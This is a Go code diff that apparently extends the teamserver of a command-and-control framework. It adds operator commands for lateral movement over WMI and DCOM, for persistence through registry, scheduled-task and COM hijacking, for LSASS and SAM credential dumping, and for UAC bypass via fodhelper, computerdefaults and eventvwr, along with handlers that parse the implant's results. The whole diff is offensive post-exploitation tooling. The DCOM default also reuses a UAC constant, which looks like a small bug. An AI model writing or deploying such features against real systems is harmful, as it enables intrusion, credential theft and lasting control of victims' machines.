@@ -2349,6 +2349,204 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 		break
 
+	case COMMAND_LATERAL:
+		var (
+			Sub    string
+			Target string
+			Cmd    string
+		)
+		if val, ok := Optional["SubCommand"].(string); ok {
+			Sub = val
+		} else {
+			return job, errors.New("command::lateral SubCommand not defined")
+		}
+		if val, ok := Optional["Target"].(string); ok {
+			Target = val
+		} else {
+			return job, errors.New("command::lateral Target not defined")
+		}
+		if val, ok := Optional["Cmd"].(string); ok {
+			Cmd = val
+		} else {
+			return job, errors.New("command::lateral Cmd not defined")
+		}
+		switch Sub {
+		case "wmi":
+			job.Data = []interface{}{
+				DEMON_LATERAL_WMI_EXEC,
+				common.EncodeUTF16(Target),
+				common.EncodeUTF16(Cmd),
+			}
+		case "dcom":
+			// reuse 1 as MMC20 default method
+			Method := DEMON_PRIVESC_UAC_FODHELPER
+			if val, ok := Optional["Method"].(string); ok {
+				switch val {
+				case "shellwindows":
+					Method = 2
+				default:
+					Method = 1
+				}
+			}
+			job.Data = []interface{}{
+				DEMON_LATERAL_DCOM_EXEC,
+				common.EncodeUTF16(Target),
+				common.EncodeUTF16(Cmd),
+				Method,
+			}
+		default:
+			return job, errors.New("command::lateral unknown sub-command: " + Sub)
+		}
+		break
+
+	case COMMAND_PERSIST:
+		var Sub string
+		if val, ok := Optional["SubCommand"].(string); ok {
+			Sub = val
+		} else {
+			return job, errors.New("command::persist SubCommand not defined")
+		}
+		switch Sub {
+		case "reg":
+			Name := ""
+			Value := ""
+			Hive := 0
+			if val, ok := Optional["Name"].(string); ok {
+				Name = val
+			}
+			if val, ok := Optional["Value"].(string); ok {
+				Value = val
+			}
+			if val, ok := Optional["Hive"].(string); ok && val == "system" {
+				Hive = 1
+			}
+			job.Data = []interface{}{
+				DEMON_PERSIST_REG,
+				common.EncodeUTF16(Name),
+				common.EncodeUTF16(Value),
+				Hive,
+			}
+		case "schtask":
+			TaskName := ""
+			Cmd := ""
+			Trigger := ""
+			if val, ok := Optional["TaskName"].(string); ok {
+				TaskName = val
+			}
+			if val, ok := Optional["Cmd"].(string); ok {
+				Cmd = val
+			}
+			if val, ok := Optional["Trigger"].(string); ok {
+				Trigger = val
+			}
+			job.Data = []interface{}{
+				DEMON_PERSIST_SCHTASK,
+				common.EncodeUTF16(TaskName),
+				common.EncodeUTF16(Cmd),
+				common.EncodeUTF16(Trigger),
+			}
+		case "com":
+			CLSID := ""
+			DllPath := ""
+			if val, ok := Optional["CLSID"].(string); ok {
+				CLSID = val
+			}
+			if val, ok := Optional["DllPath"].(string); ok {
+				DllPath = val
+			}
+			job.Data = []interface{}{
+				DEMON_PERSIST_COM,
+				common.EncodeUTF16(CLSID),
+				common.EncodeUTF16(DllPath),
+			}
+		case "remove":
+			RemoveType := DEMON_PERSIST_REMOVE_REG
+			Name := ""
+			if val, ok := Optional["RemoveType"].(string); ok {
+				switch val {
+				case "schtask":
+					RemoveType = DEMON_PERSIST_REMOVE_SCHTASK
+				case "com":
+					RemoveType = DEMON_PERSIST_REMOVE_COM
+				default:
+					RemoveType = DEMON_PERSIST_REMOVE_REG
+				}
+			}
+			if val, ok := Optional["Name"].(string); ok {
+				Name = val
+			}
+			job.Data = []interface{}{
+				DEMON_PERSIST_REMOVE,
+				RemoveType,
+				common.EncodeUTF16(Name),
+			}
+		default:
+			return job, errors.New("command::persist unknown sub-command: " + Sub)
+		}
+		break
+
+	case COMMAND_CREDS:
+		var Sub string
+		if val, ok := Optional["SubCommand"].(string); ok {
+			Sub = val
+		} else {
+			return job, errors.New("command::creds SubCommand not defined")
+		}
+		switch Sub {
+		case "lsass":
+			Filename := ""
+			if val, ok := Optional["Filename"].(string); ok {
+				Filename = val
+			}
+			job.Data = []interface{}{
+				DEMON_CREDS_LSASS,
+				common.EncodeUTF16(Filename),
+			}
+		case "sam":
+			job.Data = []interface{}{
+				DEMON_CREDS_SAM,
+			}
+		default:
+			return job, errors.New("command::creds unknown sub-command: " + Sub)
+		}
+		break
+
+	case COMMAND_PRIVESC:
+		var Sub string
+		if val, ok := Optional["SubCommand"].(string); ok {
+			Sub = val
+		} else {
+			return job, errors.New("command::privesc SubCommand not defined")
+		}
+		switch Sub {
+		case "uac":
+			Method := DEMON_PRIVESC_UAC_FODHELPER
+			Cmd := ""
+			if val, ok := Optional["Method"].(string); ok {
+				switch val {
+				case "computerdefaults":
+					Method = DEMON_PRIVESC_UAC_COMPUTERDEFAULTS
+				case "eventvwr":
+					Method = DEMON_PRIVESC_UAC_EVENTVWR
+				default:
+					Method = DEMON_PRIVESC_UAC_FODHELPER
+				}
+			}
+			if val, ok := Optional["Cmd"].(string); ok {
+				Cmd = val
+			} else {
+				return job, errors.New("command::privesc uac Cmd not defined")
+			}
+			job.Data = []interface{}{
+				DEMON_PRIVESC_UAC,
+				Method,
+				common.EncodeUTF16(Cmd),
+			}
+		default:
+			return job, errors.New("command::privesc unknown sub-command: " + Sub)
+		}
+		break
+
 	default:
 		return job, errors.New(fmt.Sprint("Command not found", Command))
 	}
@@ -6686,7 +6884,184 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 		a.AgentConsoleWithTaskID(teamserver, RequestID, Message)
 
-		break;
+		break
+
+	case COMMAND_LATERAL:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				SubCommand = Parser.ParseInt32()
+				Message    = make(map[string]string)
+			)
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_LATERAL, SubCommand: %d", AgentID, SubCommand))
+			if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+				Success := Parser.ParseInt32()
+				PID := Parser.ParseInt32()
+				if Success != 0 {
+					verb := "wmi exec"
+					if SubCommand == DEMON_LATERAL_DCOM_EXEC {
+						verb = "dcom exec"
+					}
+					Message["Type"] = "Good"
+					if PID != 0 {
+						Message["Message"] = fmt.Sprintf("Lateral %s succeeded, remote PID: %d", verb, PID)
+					} else {
+						Message["Message"] = fmt.Sprintf("Lateral %s succeeded", verb)
+					}
+				} else {
+					Message["Type"] = "Erro"
+					Message["Message"] = "Lateral movement failed"
+				}
+			} else {
+				Message["Type"] = "Erro"
+				Message["Message"] = "Lateral movement failed (invalid response)"
+			}
+			a.RequestCompleted(RequestID)
+			a.AgentConsoleWithTaskID(teamserver, RequestID, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_LATERAL, Invalid packet", AgentID))
+		}
+		break
+
+	case COMMAND_PERSIST:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				SubCommand = Parser.ParseInt32()
+				Message    = make(map[string]string)
+			)
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PERSIST, SubCommand: %d", AgentID, SubCommand))
+			if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+				Success := Parser.ParseInt32()
+				subName := map[int]string{
+					DEMON_PERSIST_REG:     "reg",
+					DEMON_PERSIST_SCHTASK: "schtask",
+					DEMON_PERSIST_COM:     "com",
+					DEMON_PERSIST_REMOVE:  "remove",
+				}[int(SubCommand)]
+				if subName == "" {
+					subName = fmt.Sprintf("%d", SubCommand)
+				}
+				if Success != 0 {
+					Message["Type"] = "Good"
+					Message["Message"] = fmt.Sprintf("persist %s succeeded", subName)
+				} else {
+					Message["Type"] = "Erro"
+					Message["Message"] = fmt.Sprintf("persist %s failed", subName)
+				}
+			} else {
+				Message["Type"] = "Erro"
+				Message["Message"] = "persist failed (invalid response)"
+			}
+			a.RequestCompleted(RequestID)
+			a.AgentConsoleWithTaskID(teamserver, RequestID, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PERSIST, Invalid packet", AgentID))
+		}
+		break
+
+	case COMMAND_CREDS:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				SubCommand = Parser.ParseInt32()
+				Message    = make(map[string]string)
+			)
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CREDS, SubCommand: %d", AgentID, SubCommand))
+			switch int(SubCommand) {
+			case DEMON_CREDS_LSASS:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					Success := Parser.ParseInt32()
+					if Success != 0 {
+						if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+							DumpPath := Parser.ParseUTF16String()
+							Message["Type"] = "Good"
+							Message["Message"] = fmt.Sprintf("lsass dump written to: %s (use download to retrieve)", DumpPath)
+						} else {
+							Message["Type"] = "Good"
+							Message["Message"] = "lsass dump succeeded"
+						}
+					} else {
+						Message["Type"] = "Erro"
+						Message["Message"] = "lsass dump failed"
+					}
+				}
+			case DEMON_CREDS_SAM:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32}) {
+					SamPath := Parser.ParseUTF16String()
+					SecPath := Parser.ParseUTF16String()
+					SysPath := Parser.ParseUTF16String()
+					Success := Parser.ParseInt32()
+					if Success != 0 {
+						Message["Type"] = "Good"
+						Message["Message"] = "SAM hives saved"
+						Output := ""
+						if SamPath != "" {
+							Output += fmt.Sprintf("  SAM:      %s\n", SamPath)
+						}
+						if SecPath != "" {
+							Output += fmt.Sprintf("  SECURITY: %s\n", SecPath)
+						}
+						if SysPath != "" {
+							Output += fmt.Sprintf("  SYSTEM:   %s\n", SysPath)
+						}
+						Message["Output"] = Output
+					} else {
+						Message["Type"] = "Erro"
+						Message["Message"] = "SAM hive dump failed (SeBackupPrivilege may be required)"
+					}
+				} else {
+					Message["Type"] = "Erro"
+					Message["Message"] = "SAM dump failed (invalid response)"
+				}
+			default:
+				Message["Type"] = "Erro"
+				Message["Message"] = fmt.Sprintf("creds unknown sub-command: %d", SubCommand)
+			}
+			a.RequestCompleted(RequestID)
+			a.AgentConsoleWithTaskID(teamserver, RequestID, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CREDS, Invalid packet", AgentID))
+		}
+		break
+
+	case COMMAND_PRIVESC:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				SubCommand = Parser.ParseInt32()
+				Message    = make(map[string]string)
+			)
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PRIVESC, SubCommand: %d", AgentID, SubCommand))
+			if int(SubCommand) == DEMON_PRIVESC_UAC {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+					UacMethod := Parser.ParseInt32()
+					Success := Parser.ParseInt32()
+					methodName := map[int]string{
+						DEMON_PRIVESC_UAC_FODHELPER:        "fodhelper",
+						DEMON_PRIVESC_UAC_COMPUTERDEFAULTS: "computerdefaults",
+						DEMON_PRIVESC_UAC_EVENTVWR:         "eventvwr",
+					}[int(UacMethod)]
+					if methodName == "" {
+						methodName = fmt.Sprintf("%d", UacMethod)
+					}
+					if Success != 0 {
+						Message["Type"] = "Good"
+						Message["Message"] = fmt.Sprintf("UAC bypass via %s succeeded - elevated process launched", methodName)
+					} else {
+						Message["Type"] = "Erro"
+						Message["Message"] = fmt.Sprintf("UAC bypass via %s failed", methodName)
+					}
+				} else {
+					Message["Type"] = "Erro"
+					Message["Message"] = "UAC bypass failed (invalid response)"
+				}
+			} else {
+				Message["Type"] = "Erro"
+				Message["Message"] = fmt.Sprintf("privesc unknown sub-command: %d", SubCommand)
+			}
+			a.RequestCompleted(RequestID)
+			a.AgentConsoleWithTaskID(teamserver, RequestID, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PRIVESC, Invalid packet", AgentID))
+		}
+		break
 
 	default:
 		logger.Debug(fmt.Sprintf("Agent: %x, Command: UNKNOWN (%d))", AgentID, CommandID))
